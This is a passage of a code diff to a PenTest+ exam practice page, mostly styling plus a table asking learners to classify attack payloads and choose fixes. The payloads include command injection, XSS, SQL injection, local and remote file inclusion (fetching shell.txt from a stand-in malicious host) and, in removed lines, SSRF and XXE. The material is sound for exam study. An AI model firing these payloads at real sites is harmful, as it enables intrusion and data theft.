@@ -222,29 +222,207 @@ table.ck td.cb{text-align:center;white-space:nowrap;}
 
 .simgrid{display:grid;grid-template-columns:minmax(0,1.25fr) minmax(0,1fr);gap:20px;align-items:start;}
 @media(max-width:820px){.simgrid{grid-template-columns:minmax(0,1fr);}}
-.net{background:var(--panel-2);border:1px solid var(--border-soft);border-radius:8px;padding:16px 12px;text-align:center;}
-.ws{display:inline-flex;flex-direction:column;align-items:center;gap:6px;padding:10px 20px 11px;border-radius:8px;background:#d9f5ee;color:#0b6b57;font-weight:700;letter-spacing:.03em;font-size:.82rem;}
-.down{color:#19b394;font-size:1.5rem;line-height:1.2;margin:4px 0;}
-.zones{display:grid;grid-template-columns:minmax(0,1fr) auto minmax(0,2.2fr);gap:8px;align-items:stretch;}
-@media(max-width:560px){.zones{grid-template-columns:1fr;}.linkarrow{transform:rotate(90deg);}}
-.zone{display:flex;flex-direction:column;border:2px dashed var(--border);border-radius:8px;padding:10px 8px 12px;min-width:0;}
-.zone h4{margin:0 0 10px;font-size:.78rem;letter-spacing:.05em;text-align:center;white-space:nowrap;}
-.zone.cdn h4,.zone.cdn .node{color:#d98200;}
-.zone.prod h4,.zone.prod .node{color:#2b6fe0;}
-.zone .nodes{flex:1;display:flex;align-items:center;justify-content:center;gap:6px;}
-.node .ico{height:52px;display:flex;align-items:center;justify-content:center;}
-.zone .arrow{color:#19b394;font-weight:700;}
-.linkarrow{align-self:center;color:#19b394;font-size:1.5rem;font-weight:700;}
-.node{background:var(--panel);border:2px solid currentColor;border-radius:8px;padding:10px 6px;min-width:110px;min-height:120px;justify-content:center;display:flex;flex-direction:column;align-items:center;gap:4px;cursor:pointer;}
-.node:hover{background:var(--panel-2);}
-.node.active{box-shadow:0 0 0 3px currentColor;}
-.node .nn{font-weight:700;font-size:.85rem;white-space:nowrap;}
-.node .nh{font-size:.65rem;opacity:.85;white-space:nowrap;}
-.nmap{margin-top:14px;border-radius:6px;overflow:hidden;border:1px solid var(--border-soft);}
-.nmap .nh2{background:#0d6efd;color:#fff;padding:10px 14px;display:flex;justify-content:space-between;align-items:center;font-weight:700;font-size:.85rem;}
-.nmap .nh2 button{background:transparent;color:#fff;border:2px solid #fff;border-radius:4px;padding:0 8px;line-height:1.4;cursor:pointer;}
-.nmap pre{margin:0;background:#050a0f;color:#c9d6e0;padding:14px 16px;font:12.5px/1.6 'IBM Plex Mono',monospace;overflow-x:auto;white-space:pre;}
-.simright .term-tabs{border-radius:8px 8px 0 0;}
+.dgm{background:#fff;border:1px solid var(--border-soft);border-radius:8px;padding:10px;}
+.dgm svg{display:block;width:100%;height:auto;max-width:580px;margin:0 auto;font-family:'Inter',system-ui,sans-serif;}
+.dgm .hot{cursor:pointer;outline:none;}
+.dgm .hot .hit{fill:transparent;stroke:transparent;stroke-width:2.5;}
+.dgm .hot:hover .hit{fill:rgba(0,112,240,.07);}
+.dgm .hot.active .hit,.dgm .hot:focus-visible .hit{fill:rgba(0,112,240,.09);stroke:#0866f5;stroke-dasharray:6 4;}
+.nmap{margin-top:12px;border-radius:6px;overflow:hidden;border:2px solid #0866f5;box-shadow:0 14px 30px rgba(10,20,70,.22);}
+.nmap .nh2{background:#0866f5;color:#fff;padding:10px 14px;display:flex;justify-content:space-between;align-items:center;font-weight:700;font-size:1rem;}
+.nmap .nh2 button{background:transparent;color:#fff;border:3px solid #fff;border-radius:6px;width:30px;height:30px;font:700 18px/1 system-ui,sans-serif;cursor:pointer;padding:0;}
+.nmap pre{margin:0;background:#232253;color:#fff;padding:14px 16px 20px;font:13px/1.75 'IBM Plex Mono',ui-monospace,monospace;overflow-x:auto;white-space:pre;}
+.simright .simtabs{display:flex;gap:6px;}
+.simright .simtab{font:700 14.5px 'Inter',sans-serif;padding:11px 18px;border:0;border-radius:6px 6px 0 0;background:#dcfafd;color:#5f8594;cursor:pointer;}
+.simright .simtab.active{background:#b4d7fb;color:#2f5688;}
+.simright .simpanel{background:#fff;border:7px solid #b4d7fb;border-radius:0 8px 8px 8px;padding:16px 8px 10px;}
+.simright .simprompt{color:#0866f5;font-weight:700;font-size:14.5px;line-height:1.6;margin:0 8px 8px;}
+.simright .simprompt strong{color:#0866f5;font-size:18px;}
+.simright .chk{background:transparent;border:0;border-radius:6px;align-items:flex-start;color:var(--text);padding:10px 8px;line-height:1.45;}
+.simright .chk:hover{background:#eef6ff;}
+.simright .chk input{margin-top:1px;}
+.simright .chk span{min-width:0;overflow-wrap:anywhere;}
+@media(max-width:560px){
+  .section.sim-q{padding:16px 12px;}
+  .dgm{padding:4px 0;margin:0 -6px;}
+  .nmap pre{font-size:11px;padding:12px 10px 16px;}
+}
+
+.hot-q .hotpanel{background:#fff;border:2px solid #e4e7f8;}
+.hot-q .urlbar{background:#fff;border-bottom:2px solid #e4e7f8;padding:16px 14px;}
+.hot-q .urlbar .nav-dots{color:#b9bdf0;font-size:19px;font-weight:700;letter-spacing:6px;white-space:nowrap;}
+.hot-q .urlbar .url{border:0;border-radius:0;padding:0 4px;min-width:0;font:500 14.5px 'Inter',sans-serif;color:var(--text);}
+.hot-q .hotprompt{border-bottom:2px solid #e4e7f8;font:500 17px/1.45 'Inter',sans-serif;display:block;padding:12px 14px;}
+.hot-q .hotprompt .cnt{display:block;margin-top:4px;padding:0;}
+.hot-q .robots{padding:6px 6px 14px;}
+.hot-q .rline{font:14px/1.5 'Inter',sans-serif;padding:3px 6px;gap:8px;}
+.hot-q .rline .rn{width:1.5em;color:var(--text);}
+.hot-q .rline input{width:15px;height:15px;margin:0;accent-color:#0070F0;}
+.hot-q .rline .rt{min-width:0;overflow-wrap:anywhere;}
+.hot-q .rline .rnote{white-space:nowrap;}
+.toolcard{background:#fff;border:2px solid #e4e7f8;border-radius:8px;overflow:hidden;}
+.toolcard .toolhead{background:#0088ff;color:#fff;font-size:16px;font-weight:600;padding:16px 20px;}
+.toolcard .toolbody{padding:18px 12px 14px;}
+.toolcard .toolprompt{font:500 17px/1.45 'Inter',sans-serif;color:var(--text);margin:0 8px 14px;}
+.hot-q .toolcard .chk{background:transparent;border:0;border-radius:6px;color:var(--text);font-size:15px;padding:11px 14px;}
+.hot-q .toolcard .chk:hover{background:#eef6ff;}
+@media(max-width:560px){.section.hot-q{padding:16px 12px;}.hot-q .hotprompt,.toolcard .toolprompt{font-size:15.5px;}.hot-q .urlbar{gap:4px;padding:12px 8px;}.hot-q .urlbar .nav-dots{letter-spacing:1px;font-size:16px;}.hot-q .urlbar .url{font-size:12.5px;white-space:normal;overflow-wrap:anywhere;}}
+
+.recon-q .rtabs{display:flex;gap:10px;margin-bottom:12px;}
+.recon-q .rtab{font:600 15px 'Inter',sans-serif;color:var(--text);background:#fff;border:2px solid transparent;border-radius:6px;padding:8px 20px;cursor:pointer;}
+.recon-q .rtab:not(.active):hover{background:#e8f3ff;}
+.recon-q .rtab.active{color:#fff;background:#0088ff;border-color:#0088ff;}
+.recon-q .rpanel{border:4px solid #0088ff;border-radius:8px;overflow:hidden;margin-bottom:12px;background:#fff;}
+.recon-q .rhead{background:#0088ff;color:#fff;font-size:15.5px;font-weight:600;padding:6px 12px 10px;}
+.recon-q .rterm{margin:0;background:#555;border:3px solid #000;color:#fff;font:12.5px/1.5 'IBM Plex Mono',ui-monospace,monospace;padding:10px 12px;overflow-x:auto;white-space:pre;}
+.recon-q .rcmds{padding:8px 10px 4px;}
+.recon-q .rcmd{display:block;width:100%;text-align:left;background:transparent;border:0;border-radius:5px;padding:7px 8px;cursor:pointer;color:#237fae;font:13px/1.5 'IBM Plex Mono',ui-monospace,monospace;overflow-wrap:anywhere;}
+.recon-q .rcmd::before{content:"root@attackermachine:~# ";color:var(--text);}
+.recon-q .rcmd:hover,.recon-q .rcmd.active{background:#e8f3ff;}
+.recon-q .rout{margin:4px 0 8px;background:#232253;color:#fff;border-radius:6px;font:12px/1.6 'IBM Plex Mono',ui-monospace,monospace;padding:10px 12px;overflow-x:auto;white-space:pre;}
+.recon-q .rnote2{font-size:12px;color:var(--text-faint);padding:0 18px 10px;}
+.recon-q .rgrid{display:grid;grid-template-columns:minmax(0,1.5fr) minmax(0,1fr);gap:12px;align-items:stretch;}
+.recon-q .rbox{border:3px solid #0088ff;border-radius:8px;background:#fff;padding:14px 8px 8px;min-width:0;}
+.recon-q .rprompt{font-weight:600;font-size:14.5px;line-height:1.55;color:var(--text);margin:0 8px 6px;}
+.recon-q .rprompt strong{font-size:17px;}
+.recon-q .rbox .chk{background:transparent;border:0;border-radius:6px;align-items:flex-start;gap:10px;color:var(--text);padding:9px 8px;line-height:1.45;}
+.recon-q .rbox .chk:hover{background:#eef6ff;}
+.recon-q .rbox .chk input{margin-top:2px;}
+.recon-q .otext{min-width:0;overflow-wrap:anywhere;}
+.recon-q .otext.mono{font:12px/1.55 'IBM Plex Mono',ui-monospace,monospace;white-space:pre-wrap;}
+.recon-q .otext code{font-family:'IBM Plex Mono',ui-monospace,monospace;}
+@media(max-width:820px){.recon-q .rgrid{grid-template-columns:minmax(0,1fr);}}
+@media(max-width:560px){.section.recon-q{padding:16px 12px;}.recon-q .rterm{font-size:10.5px;padding:8px;}.recon-q .rout{font-size:10.5px;white-space:pre-wrap;overflow-wrap:anywhere;}.recon-q .rbox .chk{flex-wrap:wrap;}.recon-q .rbox .otext{flex:1 1 calc(100% - 40px);}.recon-q .rbox .chk .badge{margin:0 0 0 27px;}}
+
+.enum-q .egrid{display:grid;grid-template-columns:minmax(0,1.3fr) minmax(0,1fr);gap:16px;align-items:start;}
+.enum-q .etabs{display:flex;gap:4px;margin-bottom:4px;}
+.enum-q .etab{font:600 14px 'Inter',sans-serif;color:var(--text);background:#fff;border:1px solid var(--border-soft);border-radius:6px 6px 0 0;padding:10px 18px;cursor:pointer;}
+.enum-q .etab:not(.active):hover{background:#e8f3ff;}
+.enum-q .etab.active{color:#fff;background:#246cff;border-color:#246cff;}
+.enum-q .eterm{margin:0;background:#232302;color:#fff;border-radius:0 6px 6px 6px;font:12.5px/1.65 'IBM Plex Mono',ui-monospace,monospace;padding:12px;height:540px;overflow:auto;white-space:pre-wrap;overflow-wrap:anywhere;}
+.enum-q .ebox{border:1px solid #246cff;border-radius:6px;overflow:hidden;background:#fff;margin-bottom:12px;}
+.enum-q .ehead{background:#246cff;color:#fff;font-weight:600;font-size:14px;line-height:1.55;padding:14px 18px;}
+.enum-q .ehead code,.enum-q .einfo code{font-family:'IBM Plex Mono',ui-monospace,monospace;}
+.enum-q .ebody{padding:8px;}
+.enum-q .einfo{padding:4px 18px;font-size:13.5px;line-height:1.7;color:var(--text);}
+.enum-q .einfo p{margin:8px 0 12px;}
+.enum-q .ewait{padding:8px 10px;font-size:12.5px;color:var(--text-faint);}
+.enum-q .ebox .chk{background:transparent;border:0;border-radius:6px;align-items:flex-start;gap:10px;color:var(--text);padding:8px 10px;line-height:1.45;}
+.enum-q .ebox .chk:hover{background:#eef6ff;}
+.enum-q .ebox .chk input{margin-top:2px;}
+.enum-q .otext{min-width:0;overflow-wrap:anywhere;}
+.enum-q .otext.mono{font:12.5px/1.55 'IBM Plex Mono',ui-monospace,monospace;}
+.enum-q .edrop{display:block;padding:10px 12px 8px;font-size:14px;color:var(--text);}
+.enum-q .edrop span{display:block;margin-bottom:6px;}
+.enum-q .edrop select{max-width:320px;}
+@media(max-width:820px){.enum-q .egrid{grid-template-columns:minmax(0,1fr);}.enum-q .eterm{height:340px;}}
+@media(max-width:560px){.section.enum-q{padding:16px 12px;}.enum-q .etab{flex:1;padding:10px 4px;}.enum-q .eterm{font-size:11px;}.enum-q .ebox .chk{flex-wrap:wrap;}.enum-q .otext{flex:1 1 calc(100% - 40px);}.enum-q .ebox .chk .badge{margin:0 0 0 27px;}}
+
+.table-q .table-wrap{background:#fff;border:0;}
+.table-q table.pbq{min-width:0;table-layout:fixed;}
+.table-q table.pbq th{color:var(--text);font:700 14.5px 'Inter',sans-serif;border-top:0;border-bottom:2px solid #12161c;padding:8px;}
+.table-q table.pbq th:nth-child(1){width:37%;}
+.table-q table.pbq th:nth-child(2){width:28%;}
+.table-q table.pbq td{padding:11px 8px;}
+.table-q td.payload code{background:transparent;padding:6px 0;font-size:12.5px;overflow-wrap:anywhere;word-break:normal;}
+.table-q .cell-select{font-family:'Inter',sans-serif;font-size:12.5px;border:1.5px solid #12161c;border-radius:3px;background-color:#fff;padding:7px 2px;}
+.table-q .cell-select.correct{border-color:var(--green);background-color:var(--badge-good-bg);}
+.table-q .cell-select.wrong{border-color:var(--red);background-color:var(--badge-bad-bg);}
+.table-q .analysis li{overflow-wrap:anywhere;margin-bottom:10px;}
+@media(max-width:700px){
+  .section.table-q{padding:16px 12px;}
+  .table-q .table-wrap{overflow:visible;}
+  .table-q table.pbq,.table-q table.pbq tbody,.table-q table.pbq tr,.table-q table.pbq td{display:block;width:100%;}
+  .table-q table.pbq thead{display:none;}
+  .table-q table.pbq tr{border:1px solid var(--border);border-radius:8px;padding:6px 4px;margin-bottom:12px;}
+  .table-q table.pbq td{border:0;padding:5px 8px;}
+  .table-q td[data-label]::before{content:attr(data-label);display:block;font-weight:700;font-size:12px;margin-bottom:4px;}
+  .table-q .cell-select{font-size:12px;}
+  .section.table-q table.pbq td{padding:5px 4px;}
+}
+
+.web-q .bwin{border:1px solid #bbb;border-radius:8px;overflow:hidden;background:#fff;}
+.web-q .btop{background:#cfced0;display:flex;align-items:flex-end;gap:22px;padding:8px 12px 0;}
+.web-q .bdots{display:flex;gap:6px;padding-bottom:9px;}
+.web-q .bdots i{width:11px;height:11px;border-radius:50%;background:#ee4b48;}
+.web-q .bdots i:nth-child(2){background:#f6bd2f;}
+.web-q .bdots i:nth-child(3){background:#45bd46;}
+.web-q .btab{background:#e9e9ea;color:#12161c;font-size:13.5px;padding:6px 24px;border-radius:8px 8px 0 0;}
+.web-q .bnav{background:#e9e9ea;display:flex;align-items:center;gap:9px;padding:6px 10px;color:#666;}
+.web-q .bback{border:0;background:transparent;color:#1d78c8;font:700 20px/1 system-ui,sans-serif;cursor:pointer;padding:2px 4px;}
+.web-q .bback:disabled{color:#aaa;cursor:default;}
+.web-q .burl{flex:1;min-width:0;background:#fff;border:1px solid #bbb;padding:5px 10px;font-size:13.5px;color:#12161c;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.web-q .bpage{min-height:420px;}
+.web-q .bwarn{background:#fdecd2;color:#8a4b00;font-size:13px;padding:9px 14px;}
+.web-q .bhome{background:#245685;padding:22px 16px 28px;text-align:center;color:#fff;min-height:420px;}
+.web-q .htitle{font-size:clamp(28px,6vw,42px);margin-bottom:18px;}
+.web-q .hfield,.web-q .hlogin{max-width:340px;margin:0 auto 10px;border-radius:8px;padding:12px 14px;font-size:15px;}
+.web-q .hfield{background:#2f528f;border:2px solid #0e2f66;text-align:left;}
+.web-q .hlogin{background:#fdb703;color:#12161c;border:2px solid #12161c;margin-top:26px;}
+.web-q .hbox{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:12px;max-width:760px;margin:24px auto 0;background:#fff;border:2px dashed #0e2f66;padding:14px;}
+.web-q .hbox button{background:#fff;border:2px solid #176a9e;border-radius:10px;font:500 13.5px 'IBM Plex Mono',ui-monospace,monospace;color:#12161c;cursor:pointer;padding:11px 6px;}
+.web-q .hbox button.hfix{min-height:76px;border-radius:14px;}
+.web-q .hbox button:hover{background:#e8f3ff;}
+.web-q .cwin{background:#66d4f9;border:1px solid #1d6f9e;padding:12px 16px 16px;max-width:480px;width:100%;margin:16px auto;color:#12161c;}
+.web-q .ctitle{font-size:22px;margin-bottom:10px;}
+.web-q .cbody{background:#ececec;border:1px solid #1d6f9e;padding:20px 16px 14px;}
+.web-q .ctabs{display:flex;}
+.web-q .ctabs span{font-size:13.5px;padding:6px 14px;background:#d9d9d9;border:1px solid #bbb;border-bottom:0;color:#333;}
+.web-q .ctabs span.on{background:#fff;color:#12161c;}
+.web-q .cpane{background:#fff;padding:12px;}
+.web-q .cinfo{border:1.5px solid #12161c;padding:12px;font-size:12.5px;line-height:1.5;}
+.web-q .chead{display:flex;align-items:center;gap:8px;border-bottom:1px solid #777;padding-bottom:6px;margin-bottom:8px;font-size:15px;}
+.web-q .cinfo ul{margin:2px 0 30px;padding-left:34px;}
+.web-q .cref{border-bottom:1px solid #777;padding-bottom:4px;margin-bottom:10px;}
+.web-q .cinfo p{margin:0 0 10px 18px;}
+.web-q .cbtns{display:flex;justify-content:flex-end;gap:8px;margin-top:10px;}
+.web-q .cbtns span{background:#d6d6d6;border:1px solid #999;font-size:11.5px;padding:5px 9px;}
+.web-q .clearn{font-size:11.5px;margin-top:6px;}
+.web-q .clearn u{color:#1d78c8;}
+.web-q .cok{margin:14px 0 0 auto;width:120px;text-align:center;background:#ddd;color:#999;font-size:20px;padding:6px;}
+.web-q .slist{max-height:520px;overflow:auto;padding:10px 12px;color:#12161c;}
+.web-q .sline{display:flex;align-items:flex-start;gap:8px;padding:2px 4px;}
+.web-q .sline code{font:12.5px/1.6 'IBM Plex Mono',ui-monospace,monospace;overflow-wrap:anywhere;min-width:0;}
+.web-q .slist.pick .sline{cursor:pointer;border-radius:4px;}
+.web-q .slist.pick .sline:hover,.web-q .slist.pick .sline:has(input:checked){background:#e8f3ff;}
+.web-q .sn{width:1.7em;flex:none;text-align:right;font-size:12px;line-height:20px;color:#555;}
+.web-q .sline input{width:14px;height:14px;margin:3px 0 0;flex:none;}
+.web-q .ckwrap{overflow-x:auto;padding:12px;}
+.web-q .cktable{border-collapse:collapse;font-size:12px;color:#12161c;min-width:860px;width:100%;}
+.web-q .cktable th,.web-q .cktable td{border:1px solid #9dbcdc;padding:4px 6px;text-align:left;height:28px;}
+.web-q .cktable th{background:#e6e6ea;font-weight:600;white-space:nowrap;}
+.web-q .cktable tr:nth-child(even) td{background:#dce9f6;}
+.web-q .cktable td:nth-child(2){max-width:230px;overflow-wrap:anywhere;}
+.web-q .cktable td.ckbox{min-width:34px;}
+.web-q .cktable label{display:flex;align-items:center;gap:5px;cursor:pointer;}
+.web-q .cktable input{width:15px;height:15px;margin:0;}
+@media(max-width:700px){
+  .web-q .cktable,.web-q .cktable tbody{display:block;min-width:0;}
+  .web-q .cktable tr.ckhead{display:none;}
+  .web-q .cktable tr{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));border:1px solid #9dbcdc;border-radius:6px;margin-bottom:10px;overflow:hidden;}
+  .web-q .cktable td,.web-q .cktable tr:nth-child(even) td{border:0;background:#fff;height:auto;max-width:none;overflow-wrap:anywhere;}
+  .web-q .cktable td:nth-child(1){grid-column:1/-1;background:#dce9f6;font-weight:700;}
+  .web-q .cktable td:nth-child(2){grid-column:1/-1;max-width:none;}
+  .web-q .cktable td::before{content:attr(data-label);display:block;font-size:10.5px;font-weight:600;color:#667;}
+  .web-q .cktable td:nth-child(1)::before{content:none;}
+  .web-q .cktable:not(.pick) td.ckbox::after{content:"—";color:#889;}
+}
+.web-q .certgrid{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);gap:14px;padding:0 14px 16px;align-items:start;}
+.web-q .ddwrap{margin-top:16px;min-width:0;}
+.web-q .ddpool{background:#0a6cb8;padding:0 8px 8px;min-height:90px;}
+.web-q .ddhead{color:#fff;font-size:16px;padding:10px 6px;background:#0a6cb8;}
+.web-q .ddopt{display:block;width:100%;text-align:left;background:#e66a1f;color:#fff;border:1.5px solid #fff;font:500 14px 'Inter',sans-serif;padding:12px;margin-bottom:5px;cursor:grab;}
+.web-q .ddhint{font-size:12px;color:var(--text-faint);margin:7px 0 2px;}
+.web-q .ddlabel{color:#1f6fb0;font-size:18px;margin:9px 0 3px;}
+.web-q .ddslot{min-height:52px;border:2px solid #e66a1f;display:flex;flex-direction:column;justify-content:center;align-items:center;padding:3px;background:#fff;}
+.web-q .ddslot .ddopt{margin:0;}
+.web-q .ddslot.over,.web-q .ddpool.over{box-shadow:0 0 0 3px rgba(0,112,240,.45);}
+.web-q .ddslot.correct{border-color:var(--green);background:var(--badge-good-bg);}
+.web-q .ddslot.wrong{border-color:var(--red);background:var(--badge-bad-bg);}
+.web-q .ddmark{font:600 11.5px 'IBM Plex Mono',monospace;padding:3px 0 1px;color:var(--text);}
+.web-q .ddq{width:34px;height:34px;border-radius:50%;border:2.5px solid #e66a1f;color:#e66a1f;font-weight:800;display:flex;align-items:center;justify-content:center;font-size:19px;}
+@media(max-width:760px){.web-q .certgrid{grid-template-columns:minmax(0,1fr);}.web-q .ddwrap{order:-1;}}
+@media(max-width:560px){.section.web-q{padding:16px 10px;}.web-q .hbox{grid-template-columns:minmax(0,1fr);padding:10px;}.web-q .hbox button.hfix{min-height:48px;}.web-q .cwin{padding:10px 8px;}.web-q .cbody{padding:12px 8px;}.web-q .ctabs span{padding:6px 8px;font-size:12px;}.web-q .certgrid{padding:0 8px 12px;}.web-q .btab{padding:6px 14px;}.web-q .bnav{gap:5px;}.web-q .burl{font-size:12px;}.web-q .sline code{font-size:11px;}}
 
 .hotpanel{border-radius:8px;overflow:hidden;border:1px solid var(--border-soft);}
 .hotprompt{padding:10px 14px;font-size:.95rem;border-bottom:1px solid var(--border-soft);display:flex;justify-content:space-between;gap:10px;align-items:flex-start;flex-wrap:wrap;font-family:'Space Grotesk',sans-serif;font-weight:600;}
@@ -438,7 +616,7 @@ ins.adsbygoogle[data-ad-status="unfilled"]{display:none !important;}
     <p class="ls-sub">Hands-on performance-based questions built around the PT0-003 skills — classify the finding, pick the right tool, and choose the fix. A multiple-choice bank is on the way.</p>
 
     <div class="ls-stats">
-      <div class="ls-stat"><b id="pbqCount">2</b><span>PBQs</span></div>
+      <div class="ls-stat"><b id="pbqCount">7</b><span>PBQs</span></div>
       <div class="ls-stat" id="mcqStat"><b id="mcqCount">0</b><span>multiple choice</span></div>
       <div class="ls-stat"><b>90</b><span>minute timer</span></div>
       <div class="ls-stat"><b>Free</b><span>no sign-up</span></div>
@@ -601,19 +779,15 @@ ins.adsbygoogle[data-ad-status="unfilled"]{display:none !important;}
    Recognition / analysis / remediation style (no attack playbooks)
 ============================================================ */
 const VULN = [
-  "OS command injection", "Reflected XSS", "Stored XSS", "SQL injection (boolean-based blind)",
-  "SQL injection (UNION-based)", "Path traversal", "Server-side request forgery (SSRF)",
-  "XML external entity (XXE)", "Server-side template injection (SSTI)", "LDAP injection"
+  "Command Injection", "DOM-based Cross Site Scripting", "SQL Injection (Error)", "SQL Injection (Stacked)",
+  "SQL Injection (Union)", "Reflected Cross Site Scripting", "Local File Inclusion", "Remote File Inclusion", "URL Redirect"
 ];
 const REMED = [
-  "Parameterized queries / prepared statements",
-  "Context-aware output encoding and a Content Security Policy",
-  "Avoid shell calls; use safe APIs with allow-listed arguments",
-  "Canonicalize paths and allow-list permitted file names",
-  "Allow-list outbound destinations; block internal and metadata addresses",
-  "Disable DTDs and external entity resolution in the XML parser",
-  "Never render user input as template code; use logic-less templates",
-  "Escape LDAP filter special characters ( * ( ) \\ NUL )"
+  "Parametrized queries",
+  "Preventing external calls",
+  "Input Sanitization .. , \\ , / , sandbox requests",
+  "Input Sanitization ' , : , $ , { , } , ( , )",
+  "Input Sanitization \" , ' , < , : , > , -"
 ];
 
 let questions = [
@@ -621,35 +795,35 @@ let questions = [
   {
     type: "table",
     kind: "Performance-based question",
-    title: "Web app assessment: classify the findings",
+    title: "Web server hardening: classify the payloads",
     scenario: [
-      "During an authorized web application test of <code>portal.acmefreight.example</code>, your proxy captured the requests below. Each one produced evidence of a vulnerability.",
-      "<strong>Instructions:</strong> For each request, select the vulnerability type and the remediation you will recommend in the report.",
-      "To restore the simulation to its original state at any time, click the <strong>Reset</strong> button."
+      "You are a security analyst tasked with hardening a web server. You have been given a list of HTTP payloads that were flagged as malicious.",
+      "<strong>Instructions:</strong> Given the following attack signatures, determine the attack type, and then identify the associated remediation to prevent the attack in the future.",
+      "If at any time you would like to bring back the initial state of the simulation, please click the <strong>Reset All</strong> button."
     ],
-    caption: "Captured requests",
+    caption: "HTTP Request Payload Table",
     vulnOptions: VULN, remedOptions: REMED,
     rows: [
-      { payload: "GET /tools/ping?host=127.0.0.1;id", vuln: "OS command injection", remed: REMED[2],
-        why: "A shell metacharacter (;) after the host value lets a second command run, so user input is reaching a shell. Don't build shell strings from input; call the function directly or allow-list arguments." },
-      { payload: "GET /search?q=<svg/onload=alert(1)>   (echoed in the results page)", vuln: "Reflected XSS", remed: REMED[1],
-        why: "The input is reflected straight back in the response for that one request, which makes it reflected XSS. Encode output for its HTML context and add a CSP." },
-      { payload: "POST /blog/42/comments   comment=<script src=//evil.example/k.js><\/script>   (shown to every visitor)", vuln: "Stored XSS", remed: REMED[1],
-        why: "The script is saved by the application and served to everyone who views the post, so it is stored (persistent) XSS. Same fix: encode output and use a CSP." },
-      { payload: "GET /item?id=7' AND 1=1-- -   vs   id=7' AND 1=2-- -   (page differs, no data shown)", vuln: "SQL injection (boolean-based blind)", remed: REMED[0],
-        why: "No data is returned, but the page behaves differently for a true vs a false condition. That true/false oracle is boolean-based blind SQLi. Parameterized queries stop it." },
-      { payload: "GET /item?id=-1 UNION SELECT username,email FROM users-- -", vuln: "SQL injection (UNION-based)", remed: REMED[0],
-        why: "UNION SELECT appends the attacker's query results to the page's own result set. Parameterized queries stop it." },
-      { payload: "GET /download?file=..%2f..%2f..%2f..%2fetc%2fpasswd", vuln: "Path traversal", remed: REMED[3],
-        why: "Encoded ../ sequences climb out of the download folder to read an arbitrary file. Canonicalize the path, confirm it stays inside the allowed folder, and allow-list file names." },
-      { payload: "POST /api/preview   url=http://169.254.169.254/latest/meta-data/", vuln: "Server-side request forgery (SSRF)", remed: REMED[4],
-        why: "The server fetches a URL the attacker supplied, here the cloud metadata service, which can leak temporary cloud credentials. Allow-list destinations, block internal and metadata ranges, and require IMDSv2." },
-      { payload: "POST /api/import   <!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><r>&x;</r>", vuln: "XML external entity (XXE)", remed: REMED[5],
-        why: "A DOCTYPE declares an external entity pointing to a local file, and the parser expands it into the response. Disable DTDs and external entities in the parser." },
-      { payload: "GET /greet?name={{7*7}}   (response: Hello 49)", vuln: "Server-side template injection (SSTI)", remed: REMED[6],
-        why: "The template engine evaluated 7*7, which proves user input is being run as template code. Pass input to templates as data only." },
-      { payload: "POST /login   user=*)(uid=*))(|(uid=*", vuln: "LDAP injection", remed: REMED[7],
-        why: "Parentheses and wildcards rewrite the LDAP search filter so it matches any user. Escape LDAP special characters or use a safe filter builder." }
+      { payload: "lookup=$(whoami)", vuln: "Command Injection", remed: REMED[3],
+        why: "$( ) makes a shell run the command inside the brackets." },
+      { payload: "search=Bob\"%3e%3cimg%20src%3da%20onerror%3dalert(1)%3e", vuln: "Reflected Cross Site Scripting", remed: REMED[4],
+        why: "The encoded image tag arrives in a search parameter, and its onerror handler runs when the server reflects it back." },
+      { payload: "logfile=%2fetc%2fpasswd%00", vuln: "Local File Inclusion", remed: REMED[2],
+        why: "The parameter asks for a local file by its encoded path, with a null byte to cut off any added extension." },
+      { payload: "#inner-tab\"><script>alert(1)<\/script>", vuln: "DOM-based Cross Site Scripting", remed: REMED[4],
+        why: "Text after # stays in the browser, so client-side script is what places it into the page." },
+      { payload: "site=www.exa`ping%20-c%2010%20localhost`mple.com", vuln: "Command Injection", remed: REMED[3],
+        why: "The backticks make a shell run ping from inside the host name." },
+      { payload: "redir=http:%2f%2fwww.malicious-site.com", vuln: "URL Redirect", remed: REMED[1],
+        why: "The redir parameter sends the user to an outside site." },
+      { payload: "item=widget';waitfor%20delay%20'00:00:20';--", vuln: "SQL Injection (Stacked)", remed: REMED[0],
+        why: "The semicolon ends the first query and stacks a second statement that delays the response." },
+      { payload: "item=widget%20union%20select%20null,null,@@version;--", vuln: "SQL Injection (Union)", remed: REMED[0],
+        why: "UNION SELECT adds the database version to the query results." },
+      { payload: "item=widget'+convert(int,@@version)+'", vuln: "SQL Injection (Error)", remed: REMED[0],
+        why: "Converting the version text to a number causes an error message that can reveal it." },
+      { payload: "logFile=http:%2f%2fwww.malicious-site.com%2fshell.txt", vuln: "Remote File Inclusion", remed: REMED[1],
+        why: "The parameter tries to load a file from a remote server." }
     ]
   },
 
@@ -690,238 +864,337 @@ let questions = [
     kind: "Performance-based question",
     title: "Reconnaissance: reading tool output",
     scenario: [
-      "You were given only the domain <code>acmefreight.example</code> and asked to enumerate public assets. The tabs below show the output you collected.",
-      "<strong>Instructions:</strong> Review each output tab and answer its findings."
+      "A penetration tester has been provided with only the public domain name and must enumerate additional information for the public-facing assets.",
+      "<strong>Instructions:</strong> Select the appropriate answer(s), given the output from each section.",
+      "If at any time you would like to bring back the initial state of the simulation, please click the <strong>Reset All</strong> button."
     ],
     outputs: [
       { label: "Output 1", text: [
-        "[*] Target: acmefreight.example","[*] Searching public sources...","",
-        "[*] Emails found: 5","----------------------",
-        "j.ortega@acmefreight.example","payroll@acmefreight.example","it-help@acmefreight.example","careers@acmefreight.example","s.webb@acmefreight.example","",
-        "[*] Hosts found: 6","---------------------",
-        "www.acmefreight.example:203.0.113.20","vpn.acmefreight.example:203.0.113.44","mail.acmefreight.example:203.0.113.25",
-        "dev.acmefreight.example:10.10.5.12","tracking.acmefreight.example:198.51.100.7","owa.acmefreight.example:203.0.113.25"
+        "Searching 100 results.","Searching 200 results.","[*] Searching Google.","",
+        "[*] No IPs found.","",
+        "[*] Emails found: 9","----------------------",
+        "afrihari@someclouddomain.org","security@someclouddomain.org","info@someclouddomain.org","gfareau@someclouddomain.org","avapretta@someclouddomain.org",
+        "lastname@someclouddomain.org","researchIT@someclouddomain.org","ghstrowski@someclouddomain.org","conferencespeakers@someclouddomain.org","",
+        "[*] Hosts found: 9","---------------------",
